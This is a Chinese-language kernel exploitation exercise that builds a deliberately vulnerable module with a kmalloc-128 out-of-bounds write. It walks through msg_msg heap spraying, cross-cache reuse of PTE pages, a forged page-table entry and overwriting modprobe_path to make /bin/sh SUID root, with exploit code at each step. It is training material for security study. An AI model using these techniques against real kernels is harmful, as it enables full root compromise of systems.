# 練習 C — Cross-cache → Dirty Pagetable 綜合題

> 目標：從一個在 `kmalloc-128` 的 OOB write 出發，走 cross-cache 把 slab page 轉成 pagetable page，布成 Dirty Pagetable，拿到任意實體記憶體 R/W，最後改 `modprobe_path` 提權。整合 Ch 13-14。

## 前置條件

- 完成 Ch 13（cross-cache attack 時序）
- 完成 Ch 14（Dirty Pagetable / Dirty Cred）
- 完成 Ch 18（data-only attack，modprobe_path）

## Vulnerable Module

```c
/* vuln_c.c：kmalloc-128 OOB write（heap overflow） */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>

#define C_ALLOC   _IOW('C', 1, unsigned int)  /* arg = size */
#define C_WRITE   _IOW('C', 2, unsigned long) /* write 到 chunk（size 由 user 控制，可越界） */
#define C_FREE    _IO('C', 3)

#define MAX_ALLOC 128

static char *g_buf   = NULL;
static unsigned int g_size = 0;

static long c_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    unsigned int sz;
    switch (cmd) {
    case C_ALLOC:
        sz = (unsigned int)arg;
        if (sz > MAX_ALLOC) return -EINVAL;
        kfree(g_buf);
        g_buf  = kzalloc(MAX_ALLOC, GFP_KERNEL);
        g_size = sz;   /* user 聲稱的 size，可能小於 MAX_ALLOC */
        return 0;
    case C_WRITE: {
        /* bug：用 user 聲稱的 g_size copy，但允許 copy 比 MAX_ALLOC 多 */
        char tmp[512];
        if (copy_from_user(tmp, (void __user *)arg, g_size)) return -EFAULT;
        /* g_size 可被 user 設成 > 128，copy_from_user 只看 g_size，
           導致 OOB write 超過 128-byte kmalloc chunk */
        memcpy(g_buf, tmp, g_size);
        return 0;
    }
    case C_FREE:
        kfree(g_buf); g_buf = NULL;
        return 0;
    }
    return -EINVAL;
}
```

**Wait**，上面的 bug 設計有問題（g_size 的 check 在 C_ALLOC 裡做了 max check）。讓我換一個更直接的設計：

```c
static long c_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case C_ALLOC:
        kfree(g_buf);
        g_buf = kzalloc(128, GFP_KERNEL);  /* 固定 128 */
        return 0;
    case C_WRITE: {
        /* bug：寫入大小來自 user，沒有上限 check */
        struct { unsigned long ptr; unsigned long len; } req;
        if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
        if (req.len > 512) return -EINVAL;  /* 只檢查 512，但 chunk 只有 128 */
        if (copy_from_user(g_buf, (void __user *)req.ptr, req.len)) return -EFAULT;
        /* req.len 128-512：OOB write 超出 chunk */
        return 0;
    }
    case C_FREE:
        kfree(g_buf); g_buf = NULL; return 0;
    }
    return -EINVAL;
}

static struct file_operations c_fops = { .unlocked_ioctl = c_ioctl };
static struct miscdevice c_dev = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln_c", .fops = &c_fops,
};
static int __init m_init(void) { return misc_register(&c_dev); }
static void __exit m_exit(void) { misc_deregister(&c_dev); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

## 任務拆解

### Task 1：確認 OOB 寫到哪（30 分鐘）

alloc chunk，然後在它的後面（相鄰的 kmalloc-128 chunk）放一個已知的 spray object（例如 `msg_msg`，能讀回來）。

```c
int fd = open("/dev/vuln_c", O_RDWR);
ioctl(fd, C_ALLOC, 0);

/* spray msg_msg 到 kmalloc-128，讓相鄰 chunk 是 msg_msg */
int q = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
for (int i = 0; i < 200; i++) spray_msg(q, 80);

struct { unsigned long ptr; unsigned long len; } req;
req.ptr = (unsigned long)payload;
req.len = 256;  /* OOB 128 bytes 到下一個 chunk */
memset(payload, 0x41, sizeof(payload));
ioctl(fd, C_WRITE, (unsigned long)&req);

/* 讀 msg_msg，看 list_head 有沒有被覆寫（0x41414141... 出現了沒） */
struct { long mtype; char text[128]; } rcv;
msgrcv(q, &rcv, sizeof(rcv.text), 0, IPC_NOWAIT|MSG_NOERROR);
```

### Task 2：精確布局 — OOB 覆寫 msg_msg.m_list（1 小時）

`msg_msg` header（48 bytes）前 16 bytes 是 `m_list`（兩個 list_head pointers）。如果你的 OOB write 從 chunk + 128 開始寫，正好覆寫到相鄰 msg_msg 的 `m_list`。

**用途**：覆寫 `m_list.next` → 讓 `msgrcv` 讀到「假的相鄰 message」→ info leak（可讀任意 kernel 地址的內容）。

這是典型的 heap OOB → adjacent object → kernel address leak 路徑。

### Task 3：cross-cache 到 PTE page（1.5 小時）

有了 info leak（KASLR bypass）之後，走 cross-cache：

1. **grooming**：spray 大量 kmalloc-128 物件，填滿 partial list
2. **OOB 觸發**：用 vuln 建立 victim chunk
3. **free all padding**：kmalloc-128 的 slab page 全部空掉，還給 buddy
4. **mmap spray**：大量 `mmap(0, 0x100000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` + `memset`，讓 kernel 分配大量 PTE page
5. **buddy reuse**：步驟 3 free 的 page 可能被 PTE allocator 拿去
6. **OOB write**：覆寫 PTE entry（8 bytes）→ 改 PTE 內容

```c
/* 步驟 6：OOB write 的 payload 是一個惡意 PTE */
uint64_t evil_pte = (target_phys & ~0xFFF)
                  | PTE_PRESENT | PTE_WRITABLE | PTE_USER;
/* 以 8-byte 對齊寫入 OOB 位置 */
char oob_payload[256];
memset(oob_payload, 0, sizeof(oob_payload));
*(uint64_t *)(oob_payload + 128) = evil_pte;  /* 剛好在下一個 chunk 開頭 */
```

### Task 4：Dirty Pagetable → 任意 phys R/W（45 分鐘）

確認 mmap 的某個 VA 被改 PTE 後，讀那個 VA 的內容是不是 target_phys 的內容。

```c
/* 驗證：target_phys 是 modprobe_path 的所在 page */
/* modprobe_path = "/sbin/modprobe" → 前幾個 char */
void *mapped = (void *)(mmap_va_base + page_offset_in_mmap);
printf("content at mapped VA: %s\n", (char *)mapped);
/* 如果印出 "/sbin/modprobe"，代表映射成功 */
```

### Task 5：改 modprobe_path + 觸發（30 分鐘）

```c
/* 準備 /tmp/x：chmod 4777 /bin/sh */
system("echo '#!/bin/sh\nchmod 4777 /bin/sh' > /tmp/x && chmod +x /tmp/x");

/* 改 modprobe_path（透過 Dirty Pagetable 的映射 VA） */
char *mpath = (char *)mapped + (modprobe_path_va & 0xFFF);
strcpy(mpath, "/tmp/x");

/* 觸發 modprobe */
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/t && chmod +x /tmp/t && /tmp/t 2>/dev/null");

/* 現在 /bin/sh 是 SUID root */
execl("/bin/sh", "sh", "-p", NULL);
```

## 除錯 checklist

- [ ] OOB 覆寫到相鄰 chunk：在 KASAN kernel 確認 slab-out-of-bounds 報告
- [ ] msg_msg list_head 被覆寫：`dmesg` 看到 list corruption 或你的 0x41 pattern 出現在 msgrcv 結果
- [ ] cross-cache 成功：mmap 的某個 page 讀到 `/sbin/modprobe` 字串
- [ ] modprobe_path 改成功：`cat /proc/sys/kernel/modprobe` 印出 `/tmp/x`
- [ ] SUID shell：`ls -la /bin/sh` 看到 `rws` flag

## 目標達成條件

跑 exploit 後執行 `/bin/sh -p`，取得 `euid=0` 的 root shell。

## 進階挑戰

1. **不用 modprobe_path**：改用 Dirty Pagetable 映射到 `init_cred` 所在物理 page，直接改 cred uid。
2. **USMA**：繼續延伸，映射 kernel `.text` page，patch `commit_creds` 前 3 bytes 為 `xor eax,eax; ret`。
3. **成功率分析**：改變 `mmap` 的大小（0x10000 / 0x100000 / 0x1000000），記錄「PTE 被改到正確 entry」的成功率。

→ [練習 D：nf_tables 類漏洞從 PoC 到 stable exploit](./practice-d-nftables-exploit.md)
